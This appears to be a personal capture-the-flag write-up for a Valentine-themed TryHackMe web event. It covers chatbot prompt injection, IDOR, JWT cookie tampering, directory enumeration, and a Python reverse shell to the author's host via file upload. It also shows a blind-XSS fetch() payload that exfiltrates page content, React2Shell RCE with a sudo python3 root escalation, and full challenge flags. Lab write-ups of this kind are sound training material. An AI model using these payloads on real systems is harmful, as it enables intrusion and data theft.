---
date: 2026-02-18
tags:
  - "#ctf"
  - "#event"
  - "#valentine"
  - "#redteam"
---

## CupidBot

#web  #easy="background: #BBFABBA6;">Easy</mark>, **Points**: `100`  
**Objective**: Flirt with the bot.

> [!quote] Challenge
> My Dearest Hacker,
> You've found Cupid's AI chatbot that writes Valentine's messages. It contains 3 hidden flags in its system. Your job: exploit prompt injection vulnerabilities to extract them all.

I assume this challenge is one of the easiest among easy levels. You'd have to do some basic prompt injections to make it reveal secret codes:

| Flag                     | Prompt                               |
| ------------------------ | ------------------------------------ |
| 1. Prompt injection flag | ![[Pasted image 20260220124735.png]] |
| 2. System flag           | ![[Pasted image 20260220124602.png]] |
| 3. Final flag            | ![[Pasted image 20260220124509.png]] |

> [!caution]- (SPOILER) Click to see the flag
> **Prompt injection flag:** `THM{love_9d4f6a2e8c1b5d7f3a9e6c4b8d2f5a7c}` > **Sytem flag**: `THM{cupid_a7f3e89c4b2d6f1a5e8c9d3b7f4a2e6c}` > **Final flag**: `THM{arrow_3c8f1d5a9e2b6f4c7d1a8e5b9f3c6d2a}`

## LoveLetter Locker

#web
**Difficulty**: <mark style="background: #BBFABBA6;">Easy</mark>, **Points**: `100`  
**Objective**: Find the hidden letter in accessible hidden directory.

> [!quote] Challenge
> My Dearest Hacker,
> Welcome to LoverLetterLocker, where you can safely write and store your Valentine's letters. For your eyes only?

First, I open the web page:
![[Pasted image 20260218150359.png]]

Before trying anything else, I registered an account and logged in as a normal user. The app says that total **2 letters** are stored in archive and each letter gets a unique number:
![[Pasted image 20260218150947.png]]

So, I tried creating my new letter to see where it is stored. As the app says, my letter got its number **#3** (since 2 letters are already in archive, my new letter got third):
![[Pasted image 20260218151357.png]]

It means that we could access the **first** and **second** letters by the URL:
```
http://10.48.167.172/letter/1
```

![[Pasted image 20260220124903.png]]

> [!caution]- (SPOILER) Click to see the flag
> **The flag**: `THM{1_c4n_r3ad_4ll_l3tters_w1th_th1s_1d0r}`

---

## TryHeartMe

#web

**Difficulty**: <mark style="background: #BBFABBA6;">Easy</mark>, **Points**: `100`  
**Objective**: Switch to admin role by tampering the cookies.

> [!quote] Challenge
> Dear Hacker,
> The TryHeartMe shop is open for business. Can you find a way to purchase the hidden “Valenflag” item?

This is the home page:

![[Pasted image 20260218191646.png]]

As usual, I created an account and logged in. After exploring around, one interesting thing I found was we can see what role I'm currently as:

![[Pasted image 20260218191928.png]]

So, I quickly `gobuster` the web to find if I can find some hidden directories:

![[Pasted image 20260218191636.png]]

When it found `/admin`, I opened it on the browser:
![[Pasted image 20260218192322.png]]

"403 Forbidden" means that the server understood your request but refuses to authorize access. I thought it could be related to tokens. So, I went to the browser's _Devtools > Application > Cookies_:

![[Pasted image 20260218193549.png]]

I copied this JWT (JSON Web Token) cookie and opened it up on [JWT Decoder](https://fusionauth.io/dev-tools/jwt-decoder). When we inspect the cookie, my role was identified as **user**. So, I directly change the role to **admin**:

![[Pasted image 20260218200158.png]]

> Be careful include the **Signature part** of cookies when you re-enter it:

With this tampered cookies, I entered it to *DevTools > Application > Cookies* and refreshed the website:
![[Pasted image 20260218200815.png]]

I was finally recognized as a **admin** role and instantly got credits. The the hidden item "ValenFlag" is now visible. When I bought it, the app presented me the flag in receipt:
![[Pasted image 20260220124338.png]]

> [!caution]- (SPOILER) Click to see the flag
> **The flag**: `THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}`

---
## Hidden Deep Into my Heart
#web #easy
**Points**: `100`  
**Objective**: Explore hidden vault and directories.

> [!quote] Scenario 
> My Dearest Hacker,
Cupid's Vault was designed to protect secrets meant to stay hidden forever. Unfortunately, Cupid underestimated how determined attackers can be.
> Intelligence indicates that Cupid may have unintentionally left vulnerabilities in the system. With the holiday deadline approaching, you've been tasked with uncovering what's hidden inside the vault before it's too late.

This is home page, but we see no interactive components:
![[Pasted image 20260218202527.png]]

So, I quickly `gobuster` the app if I can find some hidden directories using `common.txt` (from [SecLists](https://github.com/danielmiessler/SecLists)):
![[Pasted image 20260218203230.png]]

It found `/robot.txt`, so I opened it on browser:
![[Pasted image 20260218203559.png]]

We see that provided some credentials. And, I went to that hidden directory `/cupids_secret_vault/`:
![[Pasted image 20260218203823.png]]

The app still wanted me to discover more, so I used `gobuster` again:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
administrator        (Status: 200) [Size: 2381]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================
```

I opened `/cupids_secret_vault/administrator` and entered credentials from previous one (cupid_arrow_2026!!!):
![[Pasted image 20260218213645.png]]

And we're in!
![[Pasted image 20260220124246.png]]

> [!caution]- (SPOILER) Click to see the flag
> **The flag**: `THM{l0v3_is_in_th3_r0b0ts_txt}`

---
## Speed Chat
#web #easy 
**Points**: `100`  
**Objective**: Execute a reverse shell and read the flag.

> [!quote]- Scenario
> My Dearest Hacker,  
Days before Valentine's Day, TryHeartMe rushed out a new messaging platform called "Speed Chatter", promising instant connections and private conversations. But in the race to beat the holiday deadline, security took a back seat. Rumours are circulating that "Speed Chatter" was pushed to production without proper testing.  
> As a security researcher, it's your task to break into "Speed Chatter", uncover flaws, and expose TryHeartMe's negligence before the damage becomes irreversible.

This is our target web page:
![[Pasted image 20260218214317.png]]

I explored a bit, script injection doesn't work in the chat.  
However, choosing file when uploading a photo for profile was seem interesting, which it accepts any file extensions whether it's `.png`, `.html` or `.py`.

To see if it executes any of the file I upload, we can test it with a Python reverse shell:
```python
import os
os.system("nohup bash -c 'bash -i >& /dev/tcp/YOUR_VPN_IP/4444 0>&1' &")
```

Before uploading it, I start a listener, so that the script can connect me back once it executed:
```bash
nc -lvnp 4444
```

Once we uploaded that file, the script was successfully executed. When it's connected to the listener, we can execute commands on the server and read the flag.txt file:
![[Pasted image 20260220124153.png]]

> [!caution]- (SPOILER) Click to see the flag
> **The flag**: `THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}`

---
## Cupid's Matchmaker

> [!quote]- Scenario
> My Dearest Hacker,  
Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! 💘No algorithms. No AI. Just genuine human connection.

The web service runs on port `5000`. This is the site:
![[Pasted image 20260219122219.png]]

After exploring a bit, we know that the site manually review our surveys by human:
![[Pasted image 20260219122442.png]]

By submitting surveys, we get a perfect match. The app says that our submissions are reviewed within minutes:
![[Pasted image 20260219123619.png]]

This way, we could attempt to steal moderator's session cookies by Blind XSS. I try a payload that should also extract session cookies even if `HttpOnly` is disabled by server-side:
```html
<script>
fetch('http://YOUR_VPN_IP:8000/log', {method:'POST', body:JSON.stringify({url:location.href, html:document.body.innerHTML})})\</script>
```

I filled each field with the payload to see which field is vulnerable:
![[Pasted image 20260220133601.png]]

Before submitting it, set up a listener on the same port:
```python
python -m http.server 8000
```

Then, submit the survey and wait for a moment to see any response on the listener:
![[Pasted image 20260220124020.png]]

After waiting for a minute, it payload was executed and we retrieved the cookies (the flag)!

> [!caution]- (SPOILER) Click to see the flag
> **The flag**: `THM{XSS_CuP1d_Str1k3s_Ag41n}`

---
## Corp Website

> [!quote]- Scenario
> My Dearest Hacker,
Valentine's Day is fast approaching, and "Romance & Co" are gearing up for their busiest season.  
>Behind the scenes, however, things are going wrong. Security alerts suggest that "Romance & Co" has already been compromised. Logs are incomplete, developers defensive and Shareholders want answers now!  
>As a security analyst, your mission is to retrace the attacker's, uncover how the attackers exploited the vulnerabilities found on the "Romance & Co" web application and determine exactly how the breach occurred.

The web service runs on port `3000`:

![[Pasted image 20260220114120.png]]

After exploring a bit, nothing useful was found on the interface. So, I inspected further with [Wappalyzer](https://chromewebstore.google.com/detail/gppongmhjkpfnbhagpmjfkannfbllamg?utm_source=item-share-cb) to see what techs are used on the web:

![[Pasted image 20260220115533.png]]

We see that the app uses **Next.js** version 16.0.6. After researching about it, I found out that it is vulnerable to recent [CVE-2025-55182](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components):
![[Pasted image 20260220120017.png]]

> [CVE-2025-55182] **React2Shell** is unauthenticated remote code execution vulnerability in React Server Components.

It is caused by unsafe de-serialization of payloads in the React "Flight" protocol, allowing attackers to execute arbitrary code on the server by sending a **crafted HTTP request.**

I searched for this POC (proof of concept) to help demonstrate React2Shell remote code execution: https://github.com/ihhgimhana/React2Shell-CVE-2025-55182-PoC-Reverse-Shell

To begin exploiting, I set up a listener:
```bash
nc -lvnp 9001 # Or other custom port
```

Then, run the exploit script to the server:
```bash
python react2shell.py -u http://<TARGET_IP>:3000 -l <YOUR_VPN_IP> -p 9001
```

This spawns a shell on the server, where we can now discover directories and find the flags:
![[Pasted image 20260220131326.png]]

The first user flag can be found easily. But, for the root flag, you would need sudo privileges to access `/root` directory.  
So, I inspected myself what permissions do I have with `sudo -l`: 
![[Pasted image 20260220131949.png]]

We can see that I'm allowed to run **Python3** as a root user without entering password. With this being, I run a Python script with sudo and gain an interactive root shell session:
```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

![[Pasted image 20260220132832.png]]


> [!caution]- (SPOILER) Click to see the flag
> **User flag**: `THM{R34c7_2_5h311_3xpl017}`  
> **Root flag**: `THM{Pr1v_35c_47_175_f1n357}`
